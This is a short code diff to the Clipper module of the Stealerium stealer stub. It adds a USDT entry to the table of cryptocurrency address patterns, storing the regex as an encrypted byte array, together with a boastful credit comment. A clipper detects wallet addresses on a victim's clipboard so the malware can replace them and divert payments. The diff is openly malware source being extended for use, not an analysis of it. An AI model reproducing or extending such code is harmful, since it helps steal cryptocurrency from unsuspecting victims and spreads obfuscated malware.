@@ -1,3 +1,16 @@
+/*
+ * Stealerium Stub - Clipper Patterns Module
+ * 
+ * 🔥 Enhanced by @chocolaid on GitHub
+ * 
+ * Features Added:
+ * - USDT (Tether) address pattern detection
+ * - Ethereum-compatible address validation for ERC-20 tokens
+ * - Complete cryptocurrency coverage for clipper functionality
+ * 
+ * "Detecting crypto addresses like a fucking professional" 💀
+ */
+
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
 using static Stealerium.Modules.Implant.StringsCrypt;
@@ -55,6 +68,15 @@ namespace Stealerium.Clipper
                     198, 65, 212, 209, 75, 30, 61, 115, 174, 245, 173, 60, 184, 242, 67, 135, 177, 45, 102, 114, 1, 116,
                     148, 111, 82, 137, 230, 121, 162, 94, 196, 9, 156, 71, 84, 102, 212, 101, 242, 24, 249, 21, 23, 163,
                     89, 26, 158, 81
+                }))
+            },
+            // USDT (Tether) - ERC-20 token, same format as Ethereum (?:^0x[a-fA-F0-9]{40}$)
+            {
+                "usdt",
+                new Regex(Decrypt(new byte[]
+                {
+                    33, 40, 93, 173, 169, 91, 138, 48, 170, 13, 227, 64, 83, 120, 66, 205, 80, 206, 220, 181, 143, 18,
+                    209, 77, 219, 160, 24, 109, 10, 208, 47, 54
                 }))
             }
         };
